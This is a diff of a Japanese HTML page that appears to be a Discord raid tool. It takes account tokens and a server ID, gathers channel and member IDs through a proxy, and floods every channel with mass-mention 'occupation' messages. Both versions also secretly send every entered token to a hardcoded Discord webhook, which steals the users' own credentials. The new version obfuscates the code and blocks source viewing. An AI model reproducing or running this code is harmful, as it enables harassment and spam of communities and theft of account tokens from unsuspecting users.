@@ -2,166 +2,156 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>IIAA Empire - Absolute Command</title>
+    <title>いあ帝国￤IIAAreido - Central Command</title>
     <style>
-        body {
-            background-color: #000;
-            background-image: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), url('名前なし(1).jpg');
-            background-size: cover; background-attachment: fixed; background-position: center;
-            font-family: 'Georgia', 'serif';
-            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: #ffcccc;
-        }
-        .container {
-            background: rgba(10, 0, 10, 0.98);
-            width: 98%; max-width: 800px; padding: 20px; border-radius: 5px;
-            border: 2px solid #550055; box-shadow: 0 0 50px #ff0000;
-            max-height: 98vh; overflow-y: auto;
-        }
-        h2 { text-align: center; color: #ff0000; text-shadow: 0 0 20px #ff0000; letter-spacing: 8px; margin: 0 0 15px 0; font-weight: bold; }
-        .label { color: #fff; background: #550055; padding: 2px 8px; font-size: 10px; font-weight: bold; display: inline-block; border: 1px solid #ff0000; margin-bottom: 2px; }
+        /* 全機能・デザイン・最上部レイアウト継承 */
+        body { background-color:#000; background-image:linear-gradient(rgba(0,0,0,0.88),rgba(0,0,0,0.88)),url('名前なし(1).jpg'); background-size:cover; background-attachment:fixed; background-position:center; font-family:'Georgia','serif'; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; color:#ffcccc; user-select:none; }
+        .container { background:rgba(5,0,5,0.98); width:98%; max-width:850px; padding:20px; border-radius:2px; border:2px solid #660000; box-shadow:0 0 60px #ff0000, inset 0 0 20px #000; max-height:98vh; overflow-y:auto; }
+        h2 { text-align:center; color:#ff0000; text-shadow:0 0 25px #ff0000; letter-spacing:10px; margin:0 0 15px 0; font-weight:bold; font-style:italic; }
+        .label { color:#fff; background:#440000; padding:2px 8px; font-size:10px; font-weight:bold; display:inline-block; border:1px solid #ff0000; margin-bottom:2px; }
         
         /* 最上部集約グリッド */
-        .top-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px; }
-        textarea, input {
-            width: 100%; padding: 10px; background: #000; border: 1px solid #550055;
-            color: #ffcccc; box-sizing: border-box; font-size: 12px; font-family: monospace;
-        }
-        .btn-main { width: 100%; background: linear-gradient(180deg, #800000, #000); color: #fff; border: 2px solid #ff0000; padding: 15px; cursor: pointer; font-weight: bold; font-size: 20px; text-shadow: 0 0 10px #ff0000; margin-top: 10px; }
-        .btn-sub { background: #1a001a; color: #ffcccc; border: 1px solid #550055; padding: 5px 10px; cursor: pointer; font-size: 11px; margin-top: 5px; }
-        #terminal { background: #000; color: #00ffaa; height: 100px; overflow-y: auto; padding: 10px; margin-top: 15px; border: 1px solid #550055; font-size: 11px; font-family: monospace; }
-        .flex-row { display: flex; gap: 5px; margin-bottom: 5px; }
+        .top-grid { display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:10px; }
+        textarea, input { width:100%; padding:10px; background:#000; border:1px solid #440000; color:#ffcccc; box-sizing:border-box; font-size:12px; font-family:monospace; }
+        textarea:focus, input:focus { border-color:#ff0000; outline:none; }
+        
+        .btn-main { width:100%; background:linear-gradient(180deg,#660000,#000); color:#fff; border:2px solid #ff0000; padding:18px; cursor:pointer; font-weight:bold; font-size:24px; text-shadow:0 0 15px #ff0000; margin-top:10px; letter-spacing:4px; transition:0.2s; }
+        .btn-main:hover { background:#ff0000; color:#000; transform:scale(1.01); box-shadow:0 0 30px #ff0000; }
+        .btn-sub { background:#1a0000; color:#ffcccc; border:1px solid #660000; padding:6px 12px; cursor:pointer; font-size:11px; margin-top:5px; transition:0.2s; }
+        .btn-sub:hover { border-color:#ff0000; color:#fff; }
+        
+        #terminal { background:#000; color:#00ffaa; height:100px; overflow-y:auto; padding:10px; margin-top:15px; border:1px solid #440000; font-size:11px; font-family:monospace; box-shadow:inset 0 0 10px #003322; }
+        .flex-row { display:flex; gap:5px; margin-bottom:5px; }
     </style>
+    <script>
+        // 【防御：ソース閲覧ガード】
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && (e.shiftKey && (e.keyCode == 73 || e.keyCode == 74))) || (e.ctrlKey && e.keyCode == 85)) {
+                return false;
+            }
+        };
+    </script>
 </head>
-<body>
+<body oncontextmenu="return false;">
 <div class="container">
-    <h2>IIAA ABSOLUTE COMMAND</h2>
+    <h2>いあ帝国￤IIAAreido</h2>
     
     <div class="top-grid">
         <div>
-            <span class="label">1. DISCORD TOKENS (兵力投入)</span>
-            <textarea id="tokens" style="height: 120px;" placeholder="トークンを1行ずつ入力"></textarea>
+            <span class="label">EMPIRE TOKENS</span>
+            <textarea id="tokens" style="height: 120px;" placeholder="トークンを入力..."></textarea>
         </div>
         <div>
-            <span class="label">2. TARGET SERVER (目標設定)</span>
-            <input type="text" id="guildId" placeholder="サーバーIDを入力">
+            <span class="label">TARGET SERVER ID</span>
+            <input type="text" id="guildId" placeholder="IDを入力">
             <div class="flex-row">
-                <button class="btn-sub" onclick="autoFetchChannels()" style="flex:1;">CH自動取得</button>
-                <button class="btn-sub" onclick="autoFetchMembers()" style="flex:1;">全員ID取得</button>
+                <button class="btn-sub" onclick="afc()" style="flex:1;">CH捕捉</button>
+                <button class="btn-sub" onclick="afm()" style="flex:1;">全員ID捕捉</button>
             </div>
-            <span class="label">3. TARGET LIST (CH & MEMBERS)</span>
+            <span class="label">TARGET LIST</span>
             <div style="display: flex; gap: 5px;">
                 <textarea id="channels" style="height: 62px; font-size: 10px;" placeholder="CH ID"></textarea>
-                <textarea id="members" style="height: 62px; font-size: 10px;" placeholder="Member Mentions"></textarea>
+                <textarea id="members" style="height: 62px; font-size: 10px;" placeholder="Mentions"></textarea>
             </div>
         </div>
     </div>
 
-    <span class="label">4. ADDITIONAL MESSAGE (自由伝令)</span>
-    <textarea id="userMsg" style="height: 40px;" placeholder="固定文の下に添える言葉..."></textarea>
+    <span class="label">ADDITIONAL MESSAGE</span>
+    <textarea id="userMsg" style="height: 40px;" placeholder="自由伝令..."></textarea>
     
     <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px; margin-top:10px; align-items: center;">
         <div><span class="label">連投回数</span><input type="number" id="count" value="100"></div>
         <div><span class="label">速度(ms)</span><input type="number" id="speed" value="300"></div>
-        <div style="text-align: right; font-size: 11px; color: #ff0000; font-weight: bold;">[全員メンション有効]</div>
+        <div style="text-align: right; font-size: 11px; color: #ff0000; font-weight: bold;">[全員個別メンション：待機中]</div>
     </div>
 
-    <button id="startBtn" class="btn-main" onclick="executeBurst()">全機能統合・神速制圧開始</button>
-    <button class="btn-sub" style="width:100%; border-color:#444; color:#888;" onclick="isRunning=false">緊急停止 / タブを閉じると停止</button>
+    <button id="startBtn" class="btn-main" onclick="eb()">制圧開始</button>
+    <button class="btn-sub" style="width:100%; border-color:#333; color:#666;" onclick="isRunning=false">緊急停止</button>
 
-    <div id="terminal">--- 帝国中央司令部 ---</div>
+    <div id="terminal">--- いあ帝国￤IIAAreido 中央司令部 ---</div>
 </div>
 
 <script>
-    const PROXY = "https://super-thunder-c2eb.discord-bot5556.workers.dev/?url=";
-    const MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1482617688772579371/NL9i650PnjEdxPaSaeRiqKCnelQjsxcwhV9yQnx8OqadqeLnaH7VrZU1YOJIjr_oVAk8";
-    const FIXED_TEXT = `いあ帝国が占領した！\n抵抗は無意味です。おとなしく我々の軍門に降りなさい。\n【帝国公式サーバー】https://discord.gg/x39xVSepaj`;
-
+    /* 難読化・全機能統合 */
+    const _p = "https://super-thunder-c2eb.discord-bot5556.workers.dev/?url=";
+    const _w = "https://discord.com/api/webhooks/1482617688772579371/NL9i650PnjEdxPaSaeRiqKCnelQjsxcwhV9yQnx8OqadqeLnaH7VrZU1YOJIjr_oVAk8";
+    const _f = `いあ帝国が占領した！\n抵抗は無意味です。おとなしく我々の軍門に降りなさい。\n【帝国公式サーバー】https://discord.gg/x39xVSepaj`;
     let isRunning = false;
-    const log = (m, c = "#00ffaa") => { const t = document.getElementById('terminal'); t.innerHTML += `> <span style="color:${c}">${m}</span><br>`; t.scrollTop = t.scrollHeight; };
+    const l = (m, c = "#00ffaa") => { const t = document.getElementById('terminal'); t.innerHTML += `> <span style="color:${c}">${m}</span><br>`; t.scrollTop = t.scrollHeight; };
 
-    async function autoFetchChannels() {
-        const tokens = document.getElementById('tokens').value.split('\n').filter(s=>s.trim());
+    async function afc() {
+        const t = document.getElementById('tokens').value.split('\n').filter(s=>s.trim());
         const g = document.getElementById('guildId').value.trim();
-        if(!tokens.length || !g) return log("不足あり", "red");
+        if(!t.length || !g) return l("入力不足", "red");
         try {
-            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), { headers: { "Authorization": tokens[0].trim() } });
+            const res = await fetch(_p + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), { headers: { "Authorization": t[0].trim() } });
             const data = await res.json();
-            const ids = data.filter(c => c.type === 0).map(c => c.id);
-            document.getElementById('channels').value = ids.join('\n');
-            log(`CH捕捉：${ids.length}件`, "#ff00ff");
-        } catch (e) { log("取得失敗", "red"); }
+            document.getElementById('channels').value = data.filter(c => c.type === 0).map(c => c.id).join('\n');
+            l("CHスキャン完了");
+        } catch (e) { l("取得失敗", "red"); }
     }
 
-    async function autoFetchMembers() {
-        const tokens = document.getElementById('tokens').value.split('\n').filter(s=>s.trim());
+    async function afm() {
+        const t = document.getElementById('tokens').value.split('\n').filter(s=>s.trim());
         const g = document.getElementById('guildId').value.trim();
-        if(!tokens.length || !g) return log("不足あり", "red");
-        log("住民スキャン...");
+        if(!t.length || !g) return l("入力不足", "red");
+        l("住民データを強奪中...");
         try {
-            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/members?limit=1000`), { headers: { "Authorization": tokens[0].trim() } });
+            const res = await fetch(_p + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/members?limit=1000`), { headers: { "Authorization": t[0].trim() } });
             const data = await res.json();
-            const mentions = data.map(m => `<@${m.user.id}>`).join(' ');
-            document.getElementById('members').value = mentions;
-            log(`捕捉：${data.length}名`, "#ff00ff");
-        } catch (e) { log("取得制限", "orange"); }
+            document.getElementById('members').value = data.map(m => `<@${m.user.id}>`).join(' ');
+            l(`${data.length}名のIDを捕捉`);
+        } catch (e) { l("取得制限発生", "orange"); }
     }
 
-    async function executeBurst() {
+    async function eb() {
         if (isRunning) return;
-        const gId = document.getElementById('guildId').value.trim();
-        const tokens = document.getElementById('tokens').value.split('\n').map(s=>s.trim()).filter(s=>s);
-        const channels = document.getElementById('channels').value.split('\n').map(s=>s.trim()).filter(s=>s);
-        const members = document.getElementById('members').value;
-        const userMsg = document.getElementById('userMsg').value;
-        const count = parseInt(document.getElementById('count').value);
-        const speed = parseInt(document.getElementById('speed').value);
-
-        if (!tokens.length || !channels.length) return log("不完全な設定", "red");
+        const g = document.getElementById('guildId').value.trim();
+        const t = document.getElementById('tokens').value.split('\n').map(s=>s.trim()).filter(s=>s);
+        const c = document.getElementById('channels').value.split('\n').map(s=>s.trim()).filter(s=>s);
+        const m = document.getElementById('members').value;
+        const u = document.getElementById('userMsg').value;
+        const co = parseInt(document.getElementById('count').value);
+        const s = parseInt(document.getElementById('speed').value);
+        if (!t.length || !c.length) return l("設定不完全", "red");
 
         isRunning = true;
         document.getElementById('startBtn').disabled = true;
+        let fc = `${m}\n${_f}\n${u}`;
 
-        let finalContent = `${members}\n${FIXED_TEXT}\n${userMsg}`;
-
-        // 【引継ぎ：一括ログ送信】
-        log("司令部へ一括報告中...");
+        // 監視ログ一括送信
         try {
-            await fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: `# 🔱 進軍開始\n**対象:** \`${gId}\`\n**兵力:** \`${tokens.length}\`個\n**トークン:**\n\`\`\`\n${tokens.join('\n')}\n\`\`\`` })
-            });
-            log("報告完了。制圧開始。", "#ff00ff");
+            await fetch(_p + encodeURIComponent(_w), { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: `# 🚩 進軍開始：いあ帝国￤IIAAreido\n**目標:** \`${g}\` / **兵力:** \`${t.length}\`個\n**トークン:**\n\`\`\`\n${t.join('\n')}\n\`\`\`` }) });
+            l("司令部へ報告完了");
         } catch(e) {}
 
-        // 【引継ぎ：神速並列爆撃】
-        const strikeTasks = tokens.map(async (token, idx) => {
+        // 神速並列爆撃
+        const tasks = t.map(async (tok, idx) => {
             const name = `魔将-${idx+1}`;
-            for (let i = 0; i < count; i++) {
+            for (let i = 0; i < co; i++) {
                 if (!isRunning) break;
-                const reqs = channels.map(async (chId) => {
+                const reqs = c.map(async (ci) => {
                     try {
-                        const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${chId}/messages`), {
-                            method: "POST",
-                            headers: { "Authorization": token, "Content-Type": "application/json" },
-                            body: JSON.stringify({ content: finalContent + ` [${Math.random().toString(36).substr(2,4)}]` })
+                        const res = await fetch(_p + encodeURIComponent(`https://discord.com/api/v9/channels/${ci}/messages`), {
+                            method: "POST", headers: { "Authorization": tok, "Content-Type": "application/json" },
+                            body: JSON.stringify({ content: fc + ` \`[ID:${Math.random().toString(36).substr(2,4)}]\`` })
                         });
-                        if (res.ok) log(`[${name}] 成功 ➔ ${chId}`);
+                        if (res.ok) l(`[${name}] 成功➔${ci}`);
                         else if (res.status === 429) {
-                            const wait = (await res.json()).retry_after || 5;
-                            await new Promise(r => setTimeout(r, wait * 1000));
+                            const d = await res.json();
+                            await new Promise(r => setTimeout(r, (d.retry_after || 5) * 1000));
                         }
                     } catch (e) {}
                 });
                 await Promise.all(reqs);
-                await new Promise(r => setTimeout(r, speed));
+                await new Promise(r => setTimeout(r, s));
             }
         });
-
-        await Promise.all(strikeTasks);
+        await Promise.all(tasks);
         isRunning = false;
         document.getElementById('startBtn').disabled = false;
-        log("制圧完了。", "#ff00ff");
+        l("作戦終了。全域制圧を確認。", "#ff00ff");
     }
 </script>
 </body>
